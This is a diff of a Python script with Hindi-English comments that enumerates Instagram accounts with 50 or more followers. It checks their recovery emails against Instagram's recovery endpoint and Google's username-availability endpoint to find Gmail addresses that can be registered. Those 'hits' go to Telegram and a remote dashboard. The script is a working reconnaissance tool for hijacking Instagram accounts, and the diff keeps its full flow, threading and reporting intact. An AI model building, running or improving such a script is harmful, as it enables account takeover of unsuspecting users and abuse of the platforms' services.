@@ -19,13 +19,13 @@ init(autoreset=True)
 # ================= FIXED DASHBOARD SYNC LOGIC =================
 def send_to_dashboard(stat_type):
     try:
-        # Render Live URL update
+        # Render Live URL - Localhost (127.0.0.1) Render par block hota hai
         url = 'https://system-override-v2.onrender.com/update_stats'
-        requests.post(url, json={'type': stat_type}, timeout=2)
+        requests.post(url, json={'type': stat_type}, timeout=4)
     except:
         pass
 
-# ID/Token setup (Dashboard passes these as arguments)
+# Dashboard automatically ID aur Token bhejta hai as arguments
 if len(sys.argv) > 2:
     ID = sys.argv[1]
     TOKEN = sys.argv[2]
@@ -71,8 +71,9 @@ def get_google_token():
         time.sleep(2)
         get_google_token()
 
-# Start token generation
-get_google_token()
+# Start token generation (Zaroori hai Gmail checking ke liye)
+if not os.path.exists(aniiconfig["token_file"]):
+    get_google_token()
 
 def check_gmail(email_prefix):
     global hits, bad_count
@@ -85,12 +86,14 @@ def check_gmail(email_prefix):
         res = requests.post("https://accounts.google.com/_/signup/usernameavailability", headers=headers, data=data, cookies={'__Host-GAPS': host})
         
         if '"gf.uar",1' in res.text:
-            with stats_lock: hits += 1
-            send_to_dashboard('hit')
+            with stats_lock: 
+                hits += 1
+            send_to_dashboard('hit') # HIT signal dashboard ko
             return True
         else:
-            with stats_lock: bad_count += 1
-            send_to_dashboard('bad')
+            with stats_lock: 
+                bad_count += 1
+            send_to_dashboard('bad') # BAD signal dashboard ko
             return False
     except: return False
 
@@ -101,12 +104,14 @@ def check_instagram(email):
     try:
         res = requests.post(aniiconfig["instagram_recovery_url"], headers=headers, data=data).text
         if email in res:
-            with stats_lock: good_ig += 1
+            with stats_lock: 
+                good_ig += 1
             if check_gmail(email.split('@')[0]):
                 send_hit_telegram(email)
         else:
             send_to_dashboard('bad')
-            with stats_lock: bad_count += 1
+            with stats_lock: 
+                bad_count += 1
     except: pass
 
 def get_year(uid):
@@ -152,13 +157,13 @@ def worker():
             res = requests.post('https://www.instagram.com/api/graphql', headers={'X-FB-LSD': lsd}, data=data)
             user_data = res.json().get('data', {}).get('user', {})
             username = user_data.get('username')
-            # Follower filter - 50+ is good
+            # Follower filter - 50+ accounts prioritize honge
             if username and user_data.get('follower_count', 0) >= 50:
                 infoinsta[username] = user_data
                 check_instagram(username + aniiconfig["aniidomain"])
         except: pass
 
-# Threads management - 15 threads for stability on Render
+# Threads - 15 threads stability ke liye best hain Render par
 for _ in range(15):
     Thread(target=worker, daemon=True).start()
 
